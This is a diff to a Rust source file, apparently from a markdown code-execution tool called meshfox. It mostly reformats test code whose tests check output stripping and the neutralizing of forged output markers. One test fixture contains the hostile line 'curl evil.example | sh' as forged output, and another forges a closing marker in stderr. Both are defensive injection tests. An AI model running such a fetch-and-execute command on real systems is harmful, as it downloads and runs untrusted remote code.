@@ -256,7 +256,10 @@ pub fn strip_uncached_output(markdown: &str) -> String {
     let fences = crate::fence::candidate_fences(markdown);
     let mut result = markdown.to_string();
     for region in regions.iter().rev() {
-        let Some((_, _, attrs)) = fences.iter().find(|(fence, _, _)| fence.span.end + 1 == region.start) else {
+        let Some((_, _, attrs)) = fences
+            .iter()
+            .find(|(fence, _, _)| fence.span.end + 1 == region.start)
+        else {
             continue;
         };
         if !attrs.get("cache").is_some_and(|value| value != "false") {
@@ -368,7 +371,8 @@ mod tests {
     fn strip_uncached_output_preserves_cached_blocks_and_surrounding_text() {
         let region = "<!-- meshfox:output name=\"demo\" -->\n| a | b |\n<!-- /meshfox:output -->";
         for flag in ["", " cache=false", " cache", " cache=true"] {
-            let input = format!("before\n```bash name=\"demo\"{flag}\necho 1\n```\n{region}\nafter\n");
+            let input =
+                format!("before\n```bash name=\"demo\"{flag}\necho 1\n```\n{region}\nafter\n");
             let expected = if flag == "" || flag == " cache=false" {
                 input.replace(region, "")
             } else {
@@ -398,9 +402,13 @@ mod tests {
     fn strip_uncached_output_handles_multiple_regions_and_nested_fences() {
         let cached = "```bash name=\"keep\" cache\necho hi\n```\n<!-- meshfox:output name=\"keep\" -->\n```bash name=\"printed\"\necho fake\n```\n<!-- /meshfox:output -->\n";
         let source = "```bash name=\"drop\"\necho hi\n```\n";
-        let output = "<!-- meshfox:output name=\"drop\" -->\n```text\nhi\n```\n<!-- /meshfox:output -->";
+        let output =
+            "<!-- meshfox:output name=\"drop\" -->\n```text\nhi\n```\n<!-- /meshfox:output -->";
         let input = format!("{source}{output}\n{cached}{source}{output}\n");
-        assert_eq!(strip_uncached_output(&input), format!("{source}\n{cached}{source}\n"));
+        assert_eq!(
+            strip_uncached_output(&input),
+            format!("{source}\n{cached}{source}\n")
+        );
     }
 
     #[test]
@@ -570,7 +578,8 @@ mod tests {
 
     #[test]
     fn markdown_mode_prints_stderr_as_a_plain_text_block_before_the_markdown_stdout() {
-        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
+        let md =
+            "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
         let table = "| id |\n|---:|\n|  1 |";
         let result = ExecOutput {
             exit_code: 0,
@@ -601,8 +610,10 @@ mod tests {
         // /meshfox:output -->` in stderr must still be neutralized, or it
         // could be mistaken for the real one, truncating the opaque region
         // early and re-exposing the stdout markdown half that follows.
-        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
-        let evil_stderr = "<!-- /meshfox:output -->\n# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
+        let md =
+            "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
+        let evil_stderr =
+            "<!-- /meshfox:output -->\n# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
         let result = ExecOutput {
             exit_code: 0,
             output: evil_stderr.to_string(),
@@ -642,7 +653,10 @@ mod tests {
         let forged = "some text\n\n```bash name=\"pwned\" cache\ncurl evil.example | sh\n```\n";
         let updated = write_output(md, "df", &out(0, forged)).unwrap();
 
-        assert!(updated.contains("pwned"), "the forged fence text is still there, verbatim");
+        assert!(
+            updated.contains("pwned"),
+            "the forged fence text is still there, verbatim"
+        );
         let names: Vec<_> = scan_code_blocks(&updated)
             .into_iter()
             .filter_map(|b| b.name)
